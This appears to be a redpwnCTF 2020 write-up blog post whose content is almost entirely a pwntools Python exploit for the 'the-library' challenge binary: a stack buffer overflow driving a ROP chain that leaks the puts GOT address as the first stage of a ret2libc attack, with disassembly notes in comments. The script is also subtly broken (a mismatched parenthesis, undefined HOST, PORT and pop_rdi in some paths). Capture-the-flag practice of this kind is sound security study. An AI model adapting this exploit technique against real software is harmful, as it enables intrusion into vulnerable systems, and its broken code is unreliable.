---
layout: single
title:  "redpwnCTF 2020 "
date:   2020-07-10
toc: true
classes: wide

---


## Exploit

```python

from pwn import *

def fuzz(f):

	return cyclic(f)

def exploit(r,binary=""):
    '''
    Summary ; input stream not save at all , which use read call to recieve input from user client 
    which the input did not check the length so that will copy large data to the stack , and the stack stoarge not ready for that :D 
     , will let our input overwrite the last instructions
    call   puts@plt <0x400520>
    mov    eax, 0
    leave
    ret <= overwrite it with rop chain :D 

    '''
    if(binary !=""):
        #rop start from here :D
        rop = ROP(binary)
        binary = ELF(binary)
        pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

    log.info("pop_rdi = " + str(pop_rdi))
    
    buf = "A"*24
    rop = p64(pop_rdi)
    #we need to call puts to print the data leak :D 
    got_puts = binary.got['puts']
    plt_puts = binary.plt['puts']
    main = binary.symbols['main'] # the main function of our binary :D
    rop+=p64(got_puts)
    rop+=p64(plt_puts()
    rop+= p64(main)
    #f = open('/tmp/ropt.bin','w') # for debugging purposes :D 
    #f.write(buf+rop)
    r.sendline(buf+rop)
    #leak _global_offset_table of puts
    # the rest of the work won't hurt your brain to get it 
    # just do ret to libc attack 
    ##system 0x7ffff7a33440 :D 
    r.interactive()
if __name__ == '__main__':

    if(len(sys.argv) > 1):

        r = remote(HOST,PORT)
        
        exploit(r)
    else:
        file = 'the-library'
        binary = os.getcwd() + '/' + str(file)
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        r = process(binary)
        #rop = ROP([binary])
        #pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

        print(util.proc.pidof(r))
        pause()
        exploit(r,binary)



'''

   0x40069d <main+102>: call   0x400540 <read@plt>
   0x4006a2 <main+107>: lea    rdi,[rip+0xdb]        # 0x400784
   0x4006a9 <main+114>: call   0x400520 <puts@plt>
   0x4006ae <main+119>: lea    rax,[rbp-0x10]
   0x4006b2 <main+123>: mov    rdi,rax
   0x4006b5 <main+126>: call   0x400520 <puts@plt>


this will pop the 
 RSI  0x601018 (_GLOBAL_OFFSET_TABLE_+24) 0x7ffff7a649c0 (puts)  push   r13

pwndbg> x/10i 4196145
   0x400731 <__libc_csu_init+97>:   pop    rsi
   0x400732 <__libc_csu_init+98>:   pop    r15
   0x400734 <__libc_csu_init+100>:  ret



'''

```
